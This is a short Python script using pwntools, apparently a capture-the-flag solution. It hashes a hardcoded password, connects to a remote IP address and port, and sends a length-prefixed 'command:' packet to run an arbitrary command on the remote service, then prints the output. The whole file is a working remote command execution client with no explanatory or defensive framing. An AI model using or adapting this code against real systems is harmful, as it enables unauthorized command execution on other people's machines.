from pwn import *
import struct
import hashlib


def cm(c):
    cc = b"command:%s" % c
    return struct.pack("B", len(cc)) + cc


def ex(c):
    pwd = hashlib.md5(b's4v3_th3_w0rld').hexdigest().encode("ascii")
    r = remote("138.68.148.24", 30872)
    r.send(pwd)
    r.send(cm(c.encode("ascii")))
    print(r.recvall().decode("ascii"))

